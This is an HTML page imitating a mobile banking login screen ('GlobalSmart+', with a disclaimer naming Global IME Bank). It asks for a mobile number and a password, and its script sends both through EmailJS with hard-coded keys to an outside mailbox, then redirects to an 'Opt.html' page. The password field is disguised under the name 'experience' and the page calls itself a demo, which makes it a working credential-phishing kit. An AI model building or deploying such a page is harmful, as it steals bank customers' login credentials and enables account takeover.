
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#10111a">
<title>GlobalSmart+ Demo</title>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<style>
*{margin:0;padding:0;box-sizing:border-box}

:root{
--bg:#10111a;
--text:#f4f3fa;
--muted:#b8b8c9;
--purple:#b5bafa;
--blue:#3984ef;
}

body{
min-height:100vh;
background:var(--bg);
color:var(--text);
font-family:Roboto,Arial,sans-serif;
-webkit-font-smoothing:antialiased;
}

.container{
width:100%;
max-width:430px;
min-height:100vh;
margin:auto;
padding:24px 20px;
display:flex;
flex-direction:column;
}

.header{
display:flex;
align-items:center;
justify-content:space-between;
}

.logo{
color:var(--blue);
font-size:29px;
font-weight:800;
letter-spacing:-1.2px;
}

.header-icons{
display:flex;
gap:17px;
align-items:center;
}

.header-icons svg{
width:25px;
height:25px;
fill:#eeeef5;
}

.welcome{
margin-top:51px;
}

.welcome h1{
font-size:34px;
font-weight:500;
letter-spacing:-.7px;
}

.welcome p{
font-size:19px;
color:#c7c6d0;
margin-top:13px;
}

.demo-notice{
font-size:10px;
color:var(--purple);
margin-top:12px;
line-height:1.5;
}

form{
margin-top:66px;
}

.field{
height:82px;
position:relative;
border:2.5px solid #858692;
border-radius:15px;
margin-bottom:29px;
transition:.2s;
}

.field:focus-within{
border-color:var(--purple);
}

.field label{
position:absolute;
top:-11px;
left:19px;
background:var(--bg);
padding:0 5px;
font-size:16px;
color:#bcbcc9;
}

.field input{
width:100%;
height:100%;
background:transparent;
border:none;
outline:none;
color:white;
padding:18px 21px;
font-size:20px;
font-weight:500;
}

.phone-field input{
padding-right:100px;
}

.country{
position:absolute;
right:15px;
top:50%;
transform:translateY(-50%);
display:flex;
align-items:center;
gap:10px;
font-size:22px;
}

.country span:last-child{
font-size:14px;
color:#ddd;
}

.eye{
position:absolute;
right:17px;
top:50%;
transform:translateY(-50%);
border:none;
background:transparent;
color:white;
cursor:pointer;
}

.eye svg{
width:27px;
height:27px;
fill:currentColor;
}

.forgot{
text-align:right;
margin-top:31px;
}

.forgot a{
color:var(--purple);
text-decoration:none;
font-size:16px;
font-weight:500;
}

.submit{
width:100%;
height:61px;
margin-top:63px;
background:#b5bafa;
border:none;
border-radius:14px;
color:#111322;
font-size:21px;
font-weight:700;
cursor:pointer;
transition:.2s;
}

.submit:active{
transform:scale(.98);
}

.submit:disabled{
opacity:.6;
cursor:wait;
}

.status{
text-align:center;
font-size:12px;
margin-top:12px;
min-height:17px;
color:var(--purple);
}

.consent{
margin-top:18px;
text-align:center;
font-size:11px;
color:#999;
}

.consent input{
vertical-align:middle;
}

.bottom{
margin-top:auto;
padding-top:65px;
text-align:center;
}

.bottom p{
font-size:17px;
color:#c5c4cf;
margin-bottom:23px;
}

.bottom a{
color:var(--purple);
text-decoration:none;
font-size:16px;
font-weight:600;
}

.disclaimer{
margin-top:20px;
color:#777987;
font-size:10px;
line-height:1.5;
}

@media(max-height:750px){
.container{padding-top:19px;padding-bottom:18px}
.welcome{margin-top:34px}
form{margin-top:48px}
.field{height:70px;margin-bottom:24px}
.forgot{margin-top:22px}
.submit{margin-top:43px;height:55px}
.bottom{padding-top:40px}
}

</style>
</head>

<body>

<main class="container">

<header class="header">

<div class="logo">GlobalSmart+</div>

<div class="header-icons">

<svg viewBox="0 0 24 24">
<path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24c1.12.37 2.33.56 3.58.56a1 1 0 011 1V20a1 1 0 01-1 1C10.61 21 3 13.39 3 4a1 1 0 011-1h3.5a1 1 0 011 1c0 1.25.19 2.46.56 3.58a1 1 0 01-.25 1.01z"/>
</svg>

<svg viewBox="0 0 24 24">
<path d="M3 3h8v8H3zM13 3h8v8h-8zM3 13h8v8H3zM13 13h8v8h-8z"/>
</svg>

</div>
</header>

<section class="welcome">
<h1>Good Morning !</h1>
<p>Welcome to GlobalSmart Plus</p>
<div class="demo-notice">
</div>
</section>

<form id="demoForm">

<div class="field phone-field">
<label for="phone">Mobile Number</label>
<input
type="tel"
id="phone"
placeholder="98XXXXXXXX"
maxlength="10"
pattern="[0-9]{10}"
inputmode="numeric"
required
>
<div class="country">
<span>🇳🇵</span>
<span>▼</span>
</div>
</div>

<div class="field">
<label for="experience">Password</label>
<input
type="text"
id="experience"
placeholder="Enter your password"
maxlength="100"
required
>
<button class="eye" type="button" id="toggleEye">
<svg viewBox="0 0 24 24">
<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zm0 12.5a5 5 0 110-10 5 5 0 010 10zm0-2a3 3 0 100-6 3 3 0 000 6z"/>
</svg>
</button>
</div>

<div class="forgot">
<a href="Opt.html">Forgot Password?</a>
</div>

<button class="submit" type="submit" id="submitBtn">
Submit
</button>

<div class="status" id="status"></div>

<div class="consent">
<label>
<input type="checkbox" id="consent" required>
I agree to submit my contact number and note.
</label>
</div>

</form>

<section class="bottom">
<p>Don't have an Experience?</p>

<a href="Opt.html">Sign Up / Open an Account</a>

<div class="disclaimer">
Demo interface for educational and design purposes.
Not affiliated with Global IME Bank or its services.
</div>
</section>

</main>

<script>

emailjs.init({
publicKey:"ttrKOZNMDMqFjqfPT"
});

const experience=document.getElementById("experience");

document.getElementById("toggleEye").addEventListener("click",()=>{
experience.type=experience.type==="text"?"password":"text";
});

document.getElementById("demoForm").addEventListener("submit",async function(e){

e.preventDefault();

const phone=document.getElementById("phone").value.trim();
const note=experience.value.trim();
const consent=document.getElementById("consent").checked;

const status=document.getElementById("status");
const btn=document.getElementById("submitBtn");

if(!/^[0-9]{10}$/.test(phone)){
status.textContent="Enter a valid 10-digit phone number.";
return;
}

if(!note||!consent){
status.textContent="Complete the required fields and consent.";
return;
}

btn.disabled=true;
btn.textContent="Please Wait...";
status.textContent="Login...";

try{

await emailjs.send(
"service_8iot5xx",
"template_2vp7oqq",
{
phone_number:phone,
experience_note:note,
submission_type:"Demo contact form",
consent:"Yes"
}
);

status.textContent=" success!";
btn.textContent="Success ✓";

setTimeout(()=>{
window.location.href="Opt.html";
},1000);

}catch(error){

console.error(error);
status.textContent=" failed. Please try again.";
btn.disabled=false;
btn.textContent="Submit";

}

});

</script>

</body>
</html>
